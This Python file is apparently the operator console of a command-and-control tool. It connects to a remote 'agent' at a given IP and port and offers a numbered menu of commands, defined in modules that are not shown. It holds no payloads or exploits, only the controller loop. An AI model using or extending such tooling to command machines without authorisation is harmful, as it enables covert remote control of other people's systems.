import sys
import os
# Add the project root directory to sys.path
sys.path.append(os.path.dirname(os.path.abspath(__file__)) + '/../')

import argparse
from c2 import C2
from protocol.common import COMMANDS_ID_TO_DESCRIPTION


def display_menu():
    print("\nAvailable commands to send to agent")
    for command_id, description in COMMANDS_ID_TO_DESCRIPTION.items():
        print(f"{command_id}. {description}")
    print("0. Exit")

    return input("Enter an option number:\n")


# Main loop for the menu UI
def menu_loop():
    while True:
        try:
            choice = int(display_menu())
        except Exception as e:
            print(f"Error: {e}")
            print("Please enter a number from the menu and try again")
            continue

        return choice

def parse_arguments():
    parser = argparse.ArgumentParser(description="C2 UI")
    parser.add_argument("ip", help="Destination agent server IP address")
    parser.add_argument("port", type=int, help="Destination agent server IP port")

    args = parser.parse_args()
    return args.ip, args.port


def main(dst_ip, dst_port):
    print("------------C2 SERVER-------------------\n")
    c2 = C2(dst_ip, dst_port)
    c2.connect()
    while True:
        command_id = menu_loop()
        if command_id == 0:
            print("[+] C2 exiting!")
            return
        c2.handle_command_from_ui(command_id)


if __name__ == "__main__":
    dst_ip, dst_port = parse_arguments()
    main(dst_ip, dst_port)